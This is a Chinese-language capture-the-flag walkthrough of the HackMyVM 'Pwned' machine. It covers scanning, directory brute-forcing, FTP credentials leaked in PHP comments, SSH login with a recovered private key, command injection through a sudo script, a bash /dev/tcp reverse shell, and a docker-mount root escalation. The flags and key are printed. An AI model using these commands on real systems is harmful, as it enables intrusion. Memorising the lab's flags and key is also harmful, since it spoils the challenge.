# Pwned

:::note

[Linux VM] [Tested on VirtualBox] created by || annlynn

⏲️ Release Date // 2020-09-25

✔️ MD5 // 4fff941050062efd06bc63ac8e740132

☠ Root // 350

💀 User // 357

📝Notes //
Pwned is a organization hacked by an attacker. Find the vulnarable in attacker way.

:::

## 靶机启动

![靶机启动](img/image_20231200-170058.png)

靶机 IP：

```plaintext
192.168.56.103
```

## nmap 信息搜集

```bash
Nmap scan report for 192.168.56.103
Host is up (0.00031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fecd90197491aef564a8a5e86f6eef7e (RSA)
|   256 813293bded9be798af2506795fde915d (ECDSA)
|_  256 dd72745d4d2da3623e81af0951e0144a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:9B:D5:99 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.3
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.56.103
```

## fscan 信息搜集

```bash
┌─[✗]─[randark@randark-Parrot]─[~]
└──╼ $sudo ./tools/fscan_amd64 -h 192.168.56.103

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 192.168.56.103  is alive
[*] Icmp alive hosts len is: 1
192.168.56.103:80 open
192.168.56.103:21 open
192.168.56.103:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://192.168.56.103     code:200 len:3065   title:Pwned....!!
已完成 1/3 [-] ssh 192.168.56.103:22 root root111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/3 [-] ftp://192.168.56.103:21 admin a11111 Permission denied.
已完成 1/3 [-] ftp://192.168.56.103:21 www 123456!a Permission denied.
已完成 1/3 [-] ftp://192.168.56.103:21 web test Permission denied.
已完成 1/3 [-] ftp://192.168.56.103:21 root root#123 Permission denied.
已完成 1/3 [-] ssh 192.168.56.103:22 admin 1qaz2wsx ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 2/3 [-] ftp://192.168.56.103:21 wwwroot  Permission denied.
已完成 2/3 [-] ftp://192.168.56.103:21 wwwroot A123456s! Permission denied.
已完成 2/3 [-] ftp://192.168.56.103:21 data a123123 Permission denied.
已完成 3/3
```

## 访问 web 服务

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.103
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 692
Content-Type: text/html
Date: Fri, 22 Dec 2023 09:04:34 GMT
ETag: "bf9-5a9c7ca4a3440-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 06 Jul 2020 15:47:21 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<head>
<title>Pwned....!!</title>
</head>
<body>

<h1>  vanakam nanba (Hello friend) </h1>
<p></p>

<p>
<pre>



                                                                                                                 dddddddd
  PPPPPPPPPPPPPPPPP                                                                                              d::::::d
  P::::::::::::::::P                                                                                             d::::::d
  P::::::PPPPPP:::::P                                                                                            d::::::d
  PP:::::P     P:::::P                                                                                           d:::::d
    P::::P     P:::::Pwwwwwww           wwwww           wwwwwwwnnnn  nnnnnnnn        eeeeeeeeeeee        ddddddddd:::::d
    P::::P     P:::::P w:::::w         w:::::w         w:::::w n:::nn::::::::nn    ee::::::::::::ee    dd::::::::::::::d
    P::::PPPPPP:::::P   w:::::w       w:::::::w       w:::::w  n::::::::::::::nn  e::::::eeeee:::::ee d::::::::::::::::d
    P:::::::::::::PP     w:::::w     w:::::::::w     w:::::w   nn:::::::::::::::ne::::::e     e:::::ed:::::::ddddd:::::d
    P::::PPPPPPPPP        w:::::w   w:::::w:::::w   w:::::w      n:::::nnnn:::::ne:::::::eeeee::::::ed::::::d    d:::::d
    P::::P                 w:::::w w:::::w w:::::w w:::::w       n::::n    n::::ne:::::::::::::::::e d:::::d     d:::::d
    P::::P                  w:::::w:::::w   w:::::w:::::w        n::::n    n::::ne::::::eeeeeeeeeee  d:::::d     d:::::d
    P::::P                   w:::::::::w     w:::::::::w         n::::n    n::::ne:::::::e           d:::::d     d:::::d
  PP::::::PP                  w:::::::w       w:::::::w          n::::n    n::::ne::::::::e          d::::::ddddd::::::dd
  P::::::::P                   w:::::w         w:::::w           n::::n    n::::n e::::::::eeeeeeee   d:::::::::::::::::d
  P::::::::P                    w:::w           w:::w            n::::n    n::::n  ee:::::::::::::e    d:::::::::ddd::::d
  PPPPPPPPPP                     www             www             nnnnnn    nnnnnn    eeeeeeeeeeeeee     ddddddddd   ddddd





        A last note from Attacker :)

                   I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them.
                   Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!


            </pre>
 </p>

</body>
</html>

<!-- I forgot to add this on last note
     You are pretty smart as i thought
     so here i left it for you
     She sings very well. l loved it  -->
```

## web 服务根目录爆破

使用 `dirsearch` 进行扫描

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $sudo dirsearch -u http://192.168.56.103 -i 200
[sudo] randark 的密码：

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/192.168.56.103/_23-12-22_17-11-02.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-22_17-11-02.log

Target: http://192.168.56.103/

[17:11:02] Starting:
[17:11:08] 200 -    3KB - /index.html
[17:11:10] 200 -   41B  - /robots.txt

Task Completed
```

使用 `gobuster` 进行扫描

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.103
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/22 17:16:18 Starting gobuster in directory enumeration mode
===============================================================
/nothing              (Status: 301) [Size: 318] [--> http://192.168.56.103/nothing/]
/server-status        (Status: 403) [Size: 279]
/hidden_text          (Status: 301) [Size: 322] [--> http://192.168.56.103/hidden_text/]

===============================================================
2023/12/22 17:16:36 Finished
===============================================================
```

## `robots.txt` 信息

```bash
┌─[✗]─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.103/robots.txt
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 41
Content-Type: text/plain
Date: Fri, 22 Dec 2023 09:08:02 GMT
ETag: "29-5a9c7da6213c0"
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 06 Jul 2020 15:51:51 GMT
Server: Apache/2.4.38 (Debian)

# Group 1

User-agent: *
Allow: /nothing
```

## 访问 `/nothing/` 目录

访问 `http://192.168.56.103/nothing/`

![`/nothing` 目录](img/image_20231213-171331.png)

访问 `http://192.168.56.103/nothing/nothing.html`

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.103/nothing/nothing.html
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 156
Content-Type: text/html
Date: Fri, 22 Dec 2023 09:09:41 GMT
ETag: "c2-5aa1155f9ab51-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Fri, 10 Jul 2020 07:31:57 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
<head>
<title>Nothing</title>
</head>
<body>

<h1>i said nothing bro </h1>
<p></p>

<!--I said nothing here. you are wasting your time i don't lie-->



</body>
</html>
```

## 访问 `http://192.168.56.103/hidden_text/` 目录

![http://192.168.56.103/hidden_text/](img/image_20231218-171827.png)

访问 `http://192.168.56.103/hidden_text/secret.dic`

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $http get http://192.168.56.103//hidden_text/secret.dic
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 211
Date: Fri, 22 Dec 2023 09:14:47 GMT
ETag: "d3-5aa01e8ddb35b"
Keep-Alive: timeout=5, max=100
Last-Modified: Thu, 09 Jul 2020 13:07:42 GMT
Server: Apache/2.4.38 (Debian)

/hacked
/vanakam_nanba
/hackerman.gif
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```

## 使用泄露出来的字典做进一步爆破

下载字典

```bash
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $wget http://192.168.56.103//hidden_text/secret.dic
--2023-12-22 17:20:55--  http://192.168.56.103//hidden_text/secret.dic
正在连接 192.168.56.103:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：211
正在保存至: “secret.dic”

secret.dic                               100%[================================================================================>]     211  --.-KB/s  用时 0s

2023-12-22 17:20:55 (55.5 MB/s) - 已保存 “secret.dic” [211/211])

```

使用获得的字典进行爆破

```bash

┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $gobuster dir -w secret.dic -u http://192.168.56.103
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                secret.dic
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/22 17:21:31 Starting gobuster in directory enumeration mode
===============================================================
//pwned.vuln          (Status: 301) [Size: 321] [--> http://192.168.56.103/pwned.vuln/]

===============================================================
2023/12/22 17:21:31 Finished
===============================================================
```

## 敏感文件 `pwned.vuln`

```bash
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $wget http://192.168.56.103/pwned.vuln
--2023-12-22 17:23:01--  http://192.168.56.103/pwned.vuln
正在连接 192.168.56.103:80... 已连接。
已发出 HTTP 请求，正在等待回应... 301 Moved Permanently
位置：http://192.168.56.103/pwned.vuln/ [跟随至新的 URL]
--2023-12-22 17:23:01--  http://192.168.56.103/pwned.vuln/
再次使用存在的到 192.168.56.103:80 的连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：670 [text/html]
正在保存至: “pwned.vuln”

pwned.vuln                               100%[================================================================================>]     670  --.-KB/s  用时 0s

2023-12-22 17:23:01 (125 MB/s) - 已保存 “pwned.vuln” [670/670])
```

读取文件

```php
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $cat pwned.vuln
<!DOCTYPE html>
<html>
<head>
        <title>login</title>
</head>
<body>
                <div id="main">
                        <h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
                        <form method="POST">
                        Username <input type="text" name="username" class="text" autocomplete="off" required>
                        Password <input type="password" name="password" class="text" required>
                        <input type="submit" name="submit" id="sub">
                        </form>
                        </div>
</body>
</html>




<?php
//      if (isset($_POST['submit'])) {
//              $un=$_POST['username'];
//              $pw=$_POST['password'];
//
//      if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//              echo "welcome"
//              exit();
// }
// else
//      echo "Invalid creds"
// }
?>
```

根据文件内容，判断为 php 源码，并且此文件可以被解析

![pwned.vuln 访问](img/image_20231224-172451.png)

根据文件内容，怀疑为 ftp 凭据，尝试利用

## ftp 凭据利用

登录 ftp 服务

```bash
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $ftp 192.168.56.103
Connected to 192.168.56.103.
220 (vsFTPd 3.0.3)
Name (192.168.56.103:randark): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

发现存在一个 `/share` 目录

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
```

在 `/share` 目录中发现两个文件

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
```

下载下来后查看文件内容

```plaintext title="note.txt"
Wow you are here

ariana won't happy about this note

sorry ariana :(
```

```plaintext title="id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## SSH 私钥利用

首先，需要对 `id_rsa` 的文件权限进行调整，便于读取

```bash
┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $chmod 600 id_rsa
```

然后根据 `note.txt` 的文件内容，可以得到用户名信息

```plaintext
ariana
```

于是可以直接利用私钥登录 SSH 服务

```bash
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Pwned]
└──╼ $ssh ariana@192.168.56.103 -i id_rsa
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
ariana@pwned:~$
```

## user pwned

```bash
ariana@pwned:~$ cat user1.txt
congratulations you Pwned ariana

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

## `sudo -l` 敏感服务

执行 `sudo -l`

```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

查看 `/home/messenger.sh` 文件内容

```bash title="/home/messenger.sh"
#!/bin/bash
clear
echo "Welcome to linux.messenger"
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message :" name
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name"

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :)"
                echo ""
```

## 利用 `/home/messenger.sh`

登陆上 `selena` 的 shell，并反弹 shell 出来

```bash
ariana@pwned:/home$ sudo -u selena /home/messenger.sh

Welcome to linux.messenger


ariana:
selena:
ftpuser:

Enter username to send message : ariana

Enter message for ariana :bash

Sending message to ariana
whoami
selena
bash -i >& /dev/tcp/192.168.56.102/9999 0>&1
```

侦听器上收到反连的 shell

```bash
┌─[randark@randark-Parrot]─[~]
└──╼ $pwncat-cs -lp 9999
[18:29:19] Welcome to pwncat 🐈!                                                                                                                   __main__.py:164
[18:29:52] received connection from 192.168.56.103:47384                                                                                                bind.py:84
[18:29:52] 192.168.56.103:47384: registered new host w/ db                                                                                          manager.py:957
(local) pwncat$ back
(remote) selena@pwned:/home$ whoami
selena
(remote) selena@pwned:/home$ 
```

## docker 利用

通过`id`的结果，判断环境在docker内

```bash
(remote) selena@pwned:/home$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

通过暴力挂在整个目录，实现宿主机任意文件读取

```bash
(remote) selena@pwned:/home$ docker run --rm -it -v /:/tmp/hoooost alpine chroot /tmp/hoooost sh
# ls
bin   core  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
boot  dev   home  initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz
```

## root pwned

```bash
# ls -lh
total 4.0K
-rw-r--r-- 1 root root 429 Jul 10  2020 root.txt
# cat root.txt
4d4098d64e163d2726959455d046fd7c

You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker 
```
